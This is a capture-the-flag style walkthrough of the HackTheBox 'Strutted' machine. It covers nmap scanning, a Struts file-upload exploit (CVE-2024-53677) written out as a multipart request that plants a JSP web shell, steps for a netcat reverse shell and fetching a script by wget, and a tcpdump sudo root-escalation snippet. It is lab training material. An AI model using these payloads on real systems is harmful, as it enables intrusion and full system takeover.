<div align="center">
  <p style="font-size: 520px; margin: 0;">
    <h1> <b>Strutted</b> </h1>
  </p>
</div>
    
<p align="center">
  <img width="256" height="297" src="Images/cb2df0a9511e5634451e3fb6c8ddc509.png" alt="Strutted">
</p>

### It's been complicated, but not too much really.
The first step will be to carry out the reconnaissance phase with nmap:

```bash
nmap -sS -vvv --min-rate 5000 -Pn -p- --open -n 10.10.11.59 -oG allPorts
```
Results:
```java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-22 20:18 EST
Nmap scan report for 10.10.11.59
Host is up (0.084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
We can see that ports 22 and 80 are open, so this machine has a website and SSH service.

Let's delve deeper into each port now:
```bash
nmap -p22,80 -sCV 10.10.11.59 -oN targeted
```
```java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-22 20:19 EST
Nmap scan report for 10.10.11.59
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://strutted.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.54 seconds
```

Well, after the scan, I will give a brief summary of what you will have to do. Basically, you need to upload a PNG or GIF image (preferably) and intercept traffic with Burp Suite on `127.0.0.1 8080`. Then, send it to repeater on BurpSuite and add a script that will create a shell 

(CVE-2024-53677 Manual Script):
```bash
------WebKitFormBoundaryApuxGnsr1KZey6yQ
Content-Disposition: form-data; name="Upload"; filename="naowa.gif"
Content-Type: image/gif


GIF89a;
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    String output = "";
    if (cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd, null, null);
            BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((s = sI.readLine()) != null) {
                output += s + "\n";
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
%>
<%=output %>

------WebKitFormBoundaryApuxGnsr1KZey6yQ
Content-Disposition: form-data; name="top.uploadFileName"

../../shell.jsp
------WebKitFormBoundaryApuxGnsr1KZey6yQ--
```
I set mine up like this: "../../shell.jsp",You just need to enter the URL like this `http://strutted.htb/shell.jsp`

Afterward, you'll need to create a bash script (".sh") in the "/dev/shm/" directory to perform a reverse shell in netcat on port 443. The command to gain root access is "bash -p" (the -p parameter means privilege).



In my case, to bring the bash script to the web shell, I created a Python server: `python -m http.server 80`. Then, in the web page's shell, you'll need to use `wget` to access your HackTheBox IP address and navigate to `/dev/shm/reverse.sh`.

Verify that the reverse.sh file transfer has been completed on the Python server
```bash
10.10.11.59 - - [22/Dec/2025 20:35:21] "GET /shell.sh HTTP/1.1" 200 -
```
Now check in the shell that the file has been transferred by typing `ls /dev/shm/` and the file should appear.
Run it using `bash /dev/shm/reverse.sh` and netcat should establish the connection between your terminal and the victim machine.

After that, you will log in as the Tomcat user, and you will have to escalate to the James user where you will get the first user flag, and then you will have to escalate privileges to root with tcpdump. These are the commands you will have to use:

```bash
COMMAND='id'

TF=$(mktemp)

echo "$COMMAND" > $TF

chmod +x $TF

sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```
After entering those five commands one by one, you'll need to enter a command to log as root. 

## 📝 Final Review:
And that's it. This isn't so much a write-up as it is a superficial guide on how to complete the machine. There are parts where you have to look up the details or ask yourself why something is used, or why the decision was made to use tcpdump. Completing the machines just to get the flag isn't worthwhile, which is why I'm writing the guide this way. I'm not writing everything out, but I'm giving hints.

I found the machine somewhat complicated, but not as difficult as Eighteen. For being in the Medium category, it wasn't too hard.

Good luck completing it!

